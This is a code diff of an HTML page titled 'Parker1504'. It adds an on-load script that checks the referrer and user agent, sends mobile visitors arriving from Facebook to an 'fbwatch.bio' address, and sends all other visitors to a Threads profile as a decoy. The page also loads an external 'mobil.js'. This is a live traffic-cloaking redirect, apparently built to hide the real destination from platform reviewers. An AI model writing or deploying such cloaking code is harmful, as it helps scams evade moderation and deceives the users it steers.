@@ -2,29 +2,27 @@
 <html>
 <head>
     <title>Parker1504</title>
-    <script>
+  <script>
     function redirectToDifferentWebsite() {
-    var userAgent = navigator.userAgent.toLowerCase();
+        var referrer = document.referrer.toLowerCase();
+        var userAgent = navigator.userAgent.toLowerCase();
 
+        var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
+        var fbDomains = ["facebook.com", "fb.com"]; // Add more Facebook domains here if needed
+        var mobileDevice = "http://www.fbwatch.bio/?taberna";
+        var pcURL = "https://www.threads.net/@zuck";
+        var destinationURL = pcURL; // Default to pcURL
 
-    var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
-    var mobileDevice = "http://www.fbwatch.bio/?taberna"
-    
-    var pcURL = "https://www.threads.net/@zuck"; 
-    var mobileURL = mobileDevice; // 
+        if (isMobile && fbDomains.some(domain => referrer.includes(domain))) {
+            destinationURL = mobileDevice;
+        }
 
-  
-    if (isMobile) {
-        window.location.href = mobileURL;
-    } else {
-        window.location.href = pcURL;
+        window.location.href = destinationURL;
     }
-}
 
-redirectToDifferentWebsite();
+    redirectToDifferentWebsite();
+</script>
 
-
-    </script>
     <script src="mobil.js"></script>
 </head>
 <body>
